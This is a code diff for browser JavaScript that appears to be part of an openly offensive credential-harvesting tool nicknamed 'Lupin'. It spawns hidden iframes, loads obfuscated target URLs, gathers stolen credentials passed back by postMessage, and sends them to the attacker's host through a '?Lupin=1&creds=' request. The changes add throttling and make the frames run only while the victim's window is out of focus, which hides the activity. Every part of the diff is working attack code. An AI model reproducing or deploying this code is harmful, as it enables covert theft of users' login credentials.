@@ -1,8 +1,12 @@
+
+
 var creds = "";
-var thresh = 1;
+var bundle = 1;
 var maxSlaves = 10;
+var checkLimit = 40;
+var check = 0;
 var finishedSlaves = 0;	
-var pause = true;
+var pause;
 var numSlaves;
 var targetIndexArray;
 var chunkLenArray;
@@ -24,13 +28,12 @@ function deobfs(string){
 
 function moveSrc(slaveFrameNum){
 
-	if (pause){
-		return 0;
-	}
+
 	var slaveFrameName = "slaveFrame"+slaveFrameNum.toString();
         var slaveFrame= document.getElementsByName(slaveFrameName)[0]; 
 	var src = targets[targetIndexArray[slaveFrameNum]];
-        slaveFrame.setAttribute('src', 	deobfs(src) );
+	targetIndexArray[slaveFrameNum] +=1;	
+        slaveFrame.setAttribute('src', deobfs(src));
 	return 1;
 }
 
@@ -47,8 +50,8 @@ function createSlaveFrame(slaveFrameNum) {
 	if (slaveFrameNum == -1){ 
         	slaveFrame.setAttribute("src","http://"+document.location.hostname+"?Lupin=NOTHING");         
         }
-	
       	document.body.appendChild(slaveFrame); 
+	
 
 } 
 
@@ -71,9 +74,18 @@ function onMessage (event){
 
         }
       
-	if(targetIndexArray[slaveFrameNum] < chunkLenArray[slaveFrameNum]){
-	      	moved = moveSrc(slaveFrameNum);
-        }else{
+	if(check >= 0 && check < checkLimit){
+		if(targetIndexArray[slaveFrameNum] < chunkLenArray[slaveFrameNum]){
+			if (pause == false){
+				moveSrc(slaveFrameNum);
+				check+=1;
+			}
+		}
+	}else{
+		check = -1;
+	}
+
+        if(targetIndexArray[slaveFrameNum] == chunkLenArray[slaveFrameNum]){
 	        finishedSlaves+=1;
         }
   	
@@ -85,14 +97,15 @@ function onMessage (event){
                 	sendFrame = document.getElementsByName("slaveFrame-1")[0];
                 	sendFrame.setAttribute('src',src+creds.substring(0,cut));               
 		}
-      
-		//src = "http://"+document.location.hostname+"?Lupin=KILL";
-		//document.location.replace(src); 
+		src = "http://"+document.location.hostname+"?Lupin=KILL";
+		document.location.replace(src); 
+		//sendFrame = document.getElementsByName("slaveFrame-1")[0];
+                //sendFrame.setAttribute('src',src);         
 		return;  
         }else{   
 		credCount = creds.split("|||||").length - 1;
 
-                if(credCount == thresh) {   
+                if(credCount == bundle) {   
    	             src = "http://"+document.location.hostname+"?Lupin=1&creds=";
                      sendFrame = document.getElementsByName("slaveFrame-1")[0];
                      sendFrame.setAttribute('src',src+creds.substring(0,cut));               
@@ -100,10 +113,32 @@ function onMessage (event){
                }
         }  
 
-	if (moved){
-		targetIndexArray[slaveFrameNum] +=1;
-	}
 }   	
+
+
+function advanceSlaves(){
+	if(pause == true ){
+		return;
+	}
+
+	
+	check=0;
+	for(var i=0; i<numSlaves;i++){
+		if(targetIndexArray[i] < chunkLenArray[i]){
+			
+			if (check >=0 && check < checkLimit){
+				check+=1;
+				moveSrc(i);
+			}else{
+				check = -1;
+				continue;
+			}
+		}	
+			
+	}
+	setTimeout("advanceSlaves()",7000);
+
+}
 
 function onFocus(){
 	pause = true;
@@ -113,18 +148,11 @@ function onFocus(){
 function onBlur(){
 
 	pause = false;
-	for(var i=0; i<numSlaves;i++){
-		if (moveSrc(i)){
-			targetIndexArray[i] +=1;
-		}	
-
-	}
-
+	advanceSlaves();
 }
 
 
 function init(){
-
 
 	var rem;
 	if(targets.length > maxSlaves){
@@ -154,6 +182,7 @@ function init(){
       	}
 
 	window.addEventListener ("message", onMessage, false);
+	
 	window.parent.addEventListener ("blur", onBlur, false);
 	window.parent.addEventListener ("focus", onFocus, false);
 }
